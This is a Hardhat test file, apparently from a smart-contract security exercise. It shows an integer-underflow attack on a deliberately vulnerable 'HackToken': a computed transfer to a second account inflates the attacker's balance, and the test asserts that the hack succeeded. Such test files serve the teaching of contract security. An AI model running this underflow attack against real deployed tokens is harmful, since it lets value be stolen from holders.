process.env.NODE_ENV = "test";

const { expect } = require("chai");
const { ethers } = require("hardhat");
const { log } = require("./Utils");

describe("📗 Token", function () {
  let owner;
  let hacker;
  let hacker2;

  it("🤓 Should increase hacker balance", async function () {
    // 🔨 Addresses
    [owner, hacker, hacker2] = await ethers.getSigners();

    // 📗 Contract
    const Token = await ethers.getContractFactory("HackToken", owner);
    const MAX_UINT_8 = ethers.BigNumber.from(2).pow(8).sub(1);
    const token = await Token.deploy(100);
    await token.deployed();

    // 🗣 Logging status
    let supply = await token.totalSupply();
    let hackerBalanceBeforeAttack = await token.balanceOf(hacker.address);

    log(`💰 Supply:\n ${supply} \n`);
    log(`💰 Hacker balance:\n ${hackerBalanceBeforeAttack} \n`);

    // 👿 Hacking the contract
    const hackValue = ethers.BigNumber.from(hackerBalanceBeforeAttack)
      .add(1)
      .add(MAX_UINT_8)
      .sub(supply);

    const transferHackedTx = await token
      .connect(hacker)
      .transfer(hacker2.address, hackValue);

    await transferHackedTx.wait((confirms = 1)); // wait until the transaction is mined

    // 🗣 Logging status
    let hackerBalanceAfterAttack = await token.balanceOf(hacker.address);
    log(`💰 Supply:\n ${supply} \n`);
    log(`💰 Hacker balance:\n ${hackerBalanceAfterAttack} \n`);

    // ✅ Check if the hack was successful
    expect(hackerBalanceAfterAttack).to.gt(hackerBalanceBeforeAttack);
  });
});
